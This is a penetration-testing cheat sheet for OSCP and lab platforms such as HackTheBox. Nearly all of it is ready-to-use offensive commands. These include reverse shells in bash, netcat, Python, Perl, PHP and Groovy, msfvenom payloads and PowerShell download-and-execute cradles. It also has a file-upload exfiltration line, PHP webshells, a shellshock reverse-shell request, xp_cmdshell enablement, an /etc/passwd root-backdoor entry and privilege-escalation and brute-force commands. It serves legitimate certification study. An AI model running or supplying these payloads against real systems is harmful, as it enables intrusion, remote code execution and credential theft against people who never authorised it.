# OSCP cheat sheet 
Commands and ressources for boot2roots / OSCP / HTB / THM

## init - tools & exploits to get

| tool | comment |
| --- | --- |
|LinEnum-master | |
|linuxprivchecker||
| winpeas and linpeas| privilege-escalation-awesome-scripts-suite|
|Reconnoitre||
|pwntools||
|SecLists-master||
|wesng||
|sherlock||
|windows-privesc-check||
||https://github.com/frizb/Windows-Privilege-Escalation.git|
|fuzzy security win priv esc tutorial| http://www.fuzzysecurity.com/tutorials/16.html |
| precompiled exploits|https://github.com/abatchy17/WindowsExploits |
|hot potato||
|updated and more stable ms08_067| https://github.com/andyacer/ms08_067|
| eternal blues | https://github.com/worawit/MS17-010 |
| empire | https://github.com/EmpireProject/Empire.git	|
|nishang /  Invoke-PowerShell.ps1 | https://github.com/samratashok/nishang.git |
| watson | https://github.com/rasta-mouse/Watson.git|
| more exploits | https://github.com/SecWiki/windows-kernel-exploits |
| PrintSpoofer - JP alternative | https://github.com/dievus/printspoofer |
| process watch - catch cron jobs /sched tasks  | https://github.com/DominicBreuker/pspy |


## init 2 - more tools to get

| tool | comment |
| --- | --- |
| autorecon		    | https://github.com/Tib3rius/AutoRecon |
| sparta			| https://github.com/SECFORCE/sparta |
| winprivcheck		| https://github.com/pentestmonkey/windows-privesc-check |
| linenmu			| https://github.com/rebootuser/LinEnum |
| JAWS			    | https://github.com/411Hall/JAWS.git |
| mona			    | https://github.com/corelan/mona |
| BOF			    | https://github.com/gh0x0st/Buffer_Overflow |
| Win-Exp-Suggester | 	https://github.com/GDSSecurity/Windows-Exploit-Suggester.git |
| nishang			| https://github.com/samratashok/nishang |
| empire			| https://github.com/EmpireProject/Empire |
| linux-smart-enum	| https://github.com/diego-treitos/linux-smart-enumeration |
| LaZagne			| https://github.com/AlessandroZ/LaZagne |


## init 3 - ressources
Blogs, youtube, etc.

| Name | link | 
| --- | --- |
| ippsec | |
| 0xdf | https://0xdf.gitlab.io/ |
| thecybermentor | | 
| hacktricks | https://book.hacktricks.xyz/ |
| rhana khalil | |

## reverse dns
```c
host 10.10.10.13 10.10.10.13
dig axfr @10.10.10.13 cronos.htb           // zone transfer - needs tcp DNS - port 53
host -l <domain> <ip>
```

## vi
```c
:w !sudo tee %		            // save file without having to open it with elevated privs
export TERM=screen	            // or whatever $TERM var is - fixes broken scrolling in vi through shell
```

## tmux
```c
ctrl b + w		        // overview; use arrow keys to navigate; q to quit
```
_copy paste_
```c
1. ctrl b + [
2. ctrl space
3. alt w
4. ctrl b + ]
```
search
```c

ctrl b + [ 		// enter copy
ctrl +s 		// enter search from copy mode
ctrl +r 		// search reverse direction
```

## nmap
```py
sudo nmap ... 					                    # faster bc of raw socket / no full handshake 
/usr/share/nmap/scripts 			                # script directory
ls -lh /usr/share/nmap/scripts/*ssh*		        # list ssh related scripts
sudo nmap --script "rmi-*" 10.10.10.1		        # vuln scanning with rmi-... scripts
nmap --script-help smb-os-discovery
nmap 10.10.10.1 -p- 				                # full port scan
sudo nmap -sC -sV -oN portnmap -p21,443,80,8080 10.10.10.1
nmap -sU 					                        # UDP scan
nmap --min-rate 10000
```

## smb / netbios
```py
nmap --script=smb-...
nbtscan
enum4linux
smbclient -L 10.10.10.1 -U <user>
smbmap -H 10.10.10.1 -r				                    # list files
crackmapexec smb 10.10.10.1
sudo mount -t cifs //10.10.10.1/Backups /mnt/bkp	    # mount smb share
```

## rpc
```c
rpcclient <server>
```

## smb file transfers
might have to be used with password for some (newer) win setups
```c
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py mysmb smbdir/
net use \\10.8.104.124\mysmb
move output \\10.8.104.124\mysmb
```

## nfs
```c
nmap --script=rpcinfo
nmap --script nfs*
showmount -e 10.10.10.1
mkdir home; sudo mount -t nfs 10.10.10.1:/home home
mkdir home; sudo mount -o nolock 10.10.10.1:/home home
```

## SMTP
```c
port 25 HELO example.com
VRFY root					// user enum for user root
```

## SNMP
```c
nmap -sU --open -p 161 ...
snmpwalk -c public -v1 -t 10 10.10.10.1
snmpcheck
```

## webfiles to check
```c
robots.txt
sitemap.xml
```

## grep for passwords
```py
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
```

## directory busting
```py
nikto -host 10.10.10.68
gobuster dir --url 10.10.10.68 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
gobuster dir -u http://10.11.1.73:8080 -w /opt/SecLists-master/Discovery/Web-Content/common.txt -x html,php -t 35 -s 200,204,301,302,307 -o gob-common-ext.txt
gobuster dir -u url -w wordlist -x html,php -t 50
```

## webshells
```php
/usr/share/webshells 		                // test webshells before doing stuff with metasploit
<?php echo shell_exe(($_GET['cmd']); ?>
```

## CURL
```php
curl -X PUT -T /usr/share/webshells/aspx/cmdasp.aspx "http://10.10.10.15/sh.aspx"
curl -X MOVE -H "Destination: http://10.10.10.15/sh.aspx" http://10.10.10.15/sh.txt
```


## msfvenom
```c
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.1 lport=5577 -b '\x00' -f exe			// -b is bad byte

msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=8573 -f raw > shell.php 

msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.10.1 lport=8088 -f elf -o sh.elf

msfvenom -p php/reverse_php LHOST=10.10.10.1 LPORT=8573 -f raw > ven.php 
```

## socat
```py
sudo socat TCP4-LISTEN:443,fork file:file_to_send.txt

socat TCP4:192.168.0.10:443 file:received_file.txt, create
						// openssl req -newkey rsa:2048 -nodes -keyout myCert.key -x509 -out myCert.crt; cat myCert.key myCert.crt \> myCert.pem

sudo socat OPENSSL-LISTEN:443,cert=myCert.pem,verify=0,fork EXEC:/bin/bash			# bind shell

socat - OPENSSL:<IP-ADDRESS>:443,verify=0
```

## powershell & powercat
```c
Set-ExecutionPolicy Unrestricted

powershell -Command "$PSVersionTable.PSVersion"					                                // check powershell version

powershell -c "[Environment]::Is64BitProcess"					                                // check for 64bit powershell

cmd /c powershell -nop -exec bypass -c "iex(new-object net.webclient).downloadstring('http://10.10.10.1:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.1 -Port 8081"

powershell -c "(new-object System.Net.WebClient).DownloadFile(\"http://10.10.10.1:8000/nc.exe\",\"C:\Users\Public\Downloads\nc.exe\")"

powershell (New-Object System.Net.WebClient).UploadFile('http://10.10.10.1/upload.php', 'important.docx')

powershell -c "Invoke-Webrequest -Uri \"http:/10.10.10.1:8000/m.exe\" -OutFile \"C:\Users\Public\Downloads\m.exe\""

10.10.10.9/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://10.10.10.1:8000/Sherlock.ps1');Find-AllVulns		// IEX doesnt need "

echo "IEX (New-object System.net.webclient).DownloadString('http://10.10.10.1:8000/s.ps1')" | powershell -noprofile -					                                                        // might circumvent some basic filters for "powershell -c "
```

### autologon
```c
// this uses Start-Process which might get killed in whacky shells, might have to look into Start-job 
powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd 10.10.10.1 8083' -Credential $cred"
```

## msfconsole
```c
search suggester

use exploit/multi/handler

sessions 1

set AutoRunScript post/windows/manage/smart_migrate
```

## windows postexploit enum general
+ in general: search credentials on the system or check for execs that run with elevated privileges and can be modified (scheduled tasks, drivers)
```
systeminfo
whoami /ALL
net users
net users <username>
```

## windows task services etc.
```c
tasklist /SVC
netsh firewall show state		                                                                    // and 'show config'
schtasks /query /fo LIST /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path		// not stable from crappy shell / powershell might cause issues here 
```
 
```c
sc query
sc qc <service-name> 
accesschk.exe -uws "Everyone" "C:\Program Files"

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

wmic qfe get Caption,Description,HotFixID,InstalledOn			// no new patches - KEXP pretty likely
```

## common windows privesc checks
function call might have to be put at the end of the file instead of starting it after semicolon if the execution fails
```c
powershell -nop -exec bypass -c "IEX(new-object net.webclient).downloadstring(\"http://10.10.10.1:8000/jaws-enum.ps1\")"

powershell -nop -exec bypass -c "IEX(new-object net.webclient).downloadstring(\"http://10.10.10.1:8000/PowerUp.ps1\");Invoke-AllChecks"		// get this version of PowerUp: /usr/lib/python3/dist-packages/cme/data/powersploit/Privesc/PowerUp.ps1

powershell -nop -exec bypass -c "IEX(new-object net.webclient).downloadstring(\"http://10.10.10.1:8000/Sherlock.ps1\");Find-AllVulns"

./windows-exploit-suggester.py --database 2020-09-20-mssb.xls --systeminfo ~/Documents/hackthebox/optimum/sysinfo
```

```py
https://github.com/SecWiki/windows-kernel-exploits			# check how precomped exploits work
https://fuzzysecurity.com/tutorials/16.html
```

## linux privesc enum
```
uname -a
whoami
/etc/passwd			// users
ss -tulpn
ps aux
ls -havl /			// special directories?!
ls -R /home			// files in home and permissions
cat /etc/hosts			// connections and known hosts
cat /etc/fstab			// maybe passwords?!
grep -RoiE "password.{20}"
grep -R db_passwd		// mysql

wget http://10.10.10.1:8000/LinEnum.sh
```
see also:
```
https://github.com/diego-treitos/linux-smart-enumeration
LinPEAS
```

## impacket
```c
impacket-wmiexec pentest:"P3nT3st!"@10.10.10.1
impacket-smbserver <shareName> <sharePath>
psexec.py 			                        // works with hashes
```

## Linux writeable directories
```c
/dev/shm
/tmp
```



## reverse shells
Pentestmonkey reverse shell cheat sheet
```c
bash -i >& /dev/tcp/10.10.10.1/8083 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 8081 > /tmp/f

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.1",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
also take a look at 
```
payloadallthethings 
swisskyrepo
```

## upgrade shells 
upgrading simple shells ropnop blog
```c
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo                                     // disables visible input, so fg has to be typed blind 
fg	
```

## john
```c
/usr/share/john/ssh2john.py joanna_rsa > hash			        // create hash from pw encrypted key 
john hash --wordlist=/usr/share/wordlists/rockyou.txt pw.txt	// crack hash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt pw.txt
john --show pw.txt
```

## hydra
__copy paste URL & cookies from burp request__
```py
export HYDRA_PROXY=connect://127.0.0.1:8080                             # enable proxy
unset HYDRA_PROXY                                                       # disable proxy
hydra 10.10.10.1 http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"	                                        # just copy paste site & cookies from burp request POST value and PARAMs
```

## gobuster
```c
gobuster dir -u 10.10.10.1 -w /opt/SecLists-master/Discovery/Web-Content/common.txt -x .php,.html,.txt -t 35 -s "200,204,301,302,307"
```

## metasploit
```c
edit 			// edit current exploit
reload 			// reload exploit after edit
```

## RDP xfreerdp
```c
xfreerdp /v:10.10.10.1 /u:john /p:Password123! +clipboard
rdesktop 10.10.10.1
```

## nishang
```c
ls nishang/Shells
```


## php
```php
<?php echo "test";?>				// simple test for sanity check 

<?php system($_GET['cmd']);?>

<?php file_put_contents($_GET['upload'], file_get_contents("http://10.10.10.1:8000/" . $_GET['upload']); ?>

// simple upload / exec shell
<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http:/10.10.10.1:8000/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>

php -r '$sock=fsockopen("10.10.10.1",8081);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ssh
param for outdated algorithms
```c
ssh user@10.10.10.1 -oKexAlgorithms=+diffie-hellman-group1-sha1
```

## mysql
```py
show databases;
use <db>;
show tables;
select ...
mysql -u <user> -h <host> -p
sqsh -S 10.10.10.1 -U user 	# ms-sql client mssql

sqlmap -r <file>
```

## gcc
cross compile and other things
```c
gcc (--static) -m32 -Wl,--hash-style=both sploit.c -o test		// xcompile for 32 bit system as static -----> static led to segfaults so test around with the option
sudo apt install mingw-w64			                            // cross-compiler for windows

i686-w64-mingw32-gcc -o main32.exe main.c                       // x86 compilation
x86_64-w64-mingw32-gcc -o main64.exe main.c                     // x64 compilation
```

## NTLMv1
Go to `/etc/samba/smb.conf` file and add the following, `client min protocol = NT1`.

Also check these options:
```py
# hide files start with a dot (.)
hide dot files = no

# hide pipes, sockets, devices ...
hide special files = no

# hide files with no read permissions
hide unreadable = no

# hide files with no write permissions
hide unwriteable files = no
```

## NT_STATUS_CONNECTION_DISCONNECTED
All that you have to do is edit your /etc/samba/smb.conf and add one line to the global section (which tells your system to use the old protocols when negotiating a session):
```c
client min protocol = LANMAN1
```
Save the file, hup the daemon, use your tools.
```c
service smbd restart
```

## sqli
check for __database type__
cheat cheets from pentestmonkey
```c
'
' or 1=1 --'
```
mssql stacked queries
```c
'; WAITFOR DELAY '0:0:5' --' 		

' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --'
```

## crack zip archive
```c
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt account.zip
```

## wpscan 
```c
wpscan --url 10.10.10.1 --password-attack wp-login -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
wpscan --url 10.10.10.1/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

## ldap
```py
ldapsearch -x -h 10.10.10.1 -s base namingcontexts			# returns 'dc=<name>,dc=<domain>'
ldapsearch -x -h 10.10.10.1 -b 'dc=<name>,dc=<domain>'
```

## bash scripts
```sh
cat file.txt | while read line; do echo $line; done
```

## juicyPotato
```c
C:\Users\Public\Documents\JP.exe -t * -p c:\windows\system32\cmd.exe -l 1595 -a "/c 
c:\users\public\desktop\n.exe -e cmd.exe 10.10.10.1 443"

jp.exe -t *  -p C:\windows\system32\cmd.exe -l 5338 -a "/c c:\inetpub\drupal-7.5.4\nc64.exe -e cmd.exe 10.10.10.1 443" -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}

jp.exe -t *  -p C:\windows\system32\cmd.exe -l 5338 -a "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.10.2:8000/Invoke-PowerShellTcp.ps1')"
```

## etc/passwd
is etc passwd writable? then add this: 
```c
spool:zdJ3ArwLjHIcs:0:0:root:/root:/bin/bash		// kekmagic
```

## docker privesc
```
docker run -it -v /:/mnt alpine chroot /mnt
```

## VNC viewer
```c
vncviewer 10.10.10.1 
F8			// press to send commands like ctrl + alt + del
```

## shellshock
```
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.2/8081 0>&1' http://10.10.10.1/cgi-bin/user.sh
```

## heartbleed 
```c
sslyze --heartbleed 10.10.10.1		# check heartbleed
```

## finger
```c
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.1
```

## perl reverse shell
```sh
perl -e 'use Socket;$i="10.10.10.1";$p=8089;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## image file upload 
bypass upload restriction through file type magic bytes
```c
GIF89a;			// insert at start of script
```

## VHD file analysis & VHD file extraction & VHD mounting
```c
7z l <image-name> 	// 7z list files on image
7z x <image-name>	// extract files
apt isntall libguestfs-tools
sudo guestmount --add /mnt/bkp/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/winvhd			// mount vhd image
```

## Jenkins
groovy reverse shell
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
